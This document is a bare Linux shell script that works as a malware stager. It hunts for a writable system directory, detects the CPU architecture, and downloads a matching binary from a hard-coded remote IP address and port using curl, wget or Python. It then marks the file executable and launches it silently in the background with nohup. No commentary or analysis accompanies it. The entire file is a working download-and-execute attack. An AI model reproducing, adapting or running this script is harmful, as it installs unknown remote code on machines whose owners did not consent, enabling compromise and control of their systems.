export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin
mkdir -p /tmp
cd /tmp
touch /usr/local/bin/writeablex >/dev/null 2>&1 && cd /usr/local/bin/
touch /usr/libexec/writeablex >/dev/null 2>&1 && cd /usr/libexec/
touch /usr/bin/writeablex >/dev/null 2>&1 && cd /usr/bin/
rm -rf /usr/local/bin/writeablex /usr/libexec/writeablex /usr/bin/writeablex
export PATH=$PATH:$(pwd)

l64="156.226.172.243:15299/?h=156.226.172.243&p=15299&t=tcp&a=l64&stage=true"
l32="156.226.172.243:15299/?h=156.226.172.243&p=15299&t=tcp&a=l32&stage=true"
a64="156.226.172.243:15299/?h=156.226.172.243&p=15299&t=tcp&a=a64&stage=true"
a32="156.226.172.243:15299/?h=156.226.172.243&p=15299&t=tcp&a=a32&stage=true"

v="f528764dtcp"
rm -rf $v

ARCH=$(uname -m)
if [ ${ARCH}x = "x86_64x" ]; then
    (curl -fsSL -m180 $l64 -o $v||wget -T180 -q $l64 -O $v||python -c 'import urllib;urllib.urlretrieve("http://'$l64'", "'$v'")')
elif [ ${ARCH}x = "i386x" ]; then
    (curl -fsSL -m180 $l32 -o $v||wget -T180 -q $l32 -O $v||python -c 'import urllib;urllib.urlretrieve("http://'$l32'", "'$v'")')
elif [ ${ARCH}x = "i686x" ]; then
    (curl -fsSL -m180 $l32 -o $v||wget -T180 -q $l32 -O $v||python -c 'import urllib;urllib.urlretrieve("http://'$l32'", "'$v'")')
elif [ ${ARCH}x = "aarch64x" ]; then
    (curl -fsSL -m180 $a64 -o $v||wget -T180 -q $a64 -O $v||python -c 'import urllib;urllib.urlretrieve("http://'$a64'", "'$v'")')
elif [ ${ARCH}x = "armv7lx" ]; then
    (curl -fsSL -m180 $a32 -o $v||wget -T180 -q $a32 -O $v||python -c 'import urllib;urllib.urlretrieve("http://'$a32'", "'$v'")')
fi

chmod +x $v
(nohup $(pwd)/$v > /dev/null 2>&1 &) || (nohup ./$v > /dev/null 2>&1 &) || (nohup /usr/bin/$v > /dev/null 2>&1 &) || (nohup /usr/libexec/$v > /dev/null 2>&1 &) || (nohup /usr/local/bin/$v > /dev/null 2>&1 &) || (nohup /tmp/$v > /dev/null 2>&1 &)
#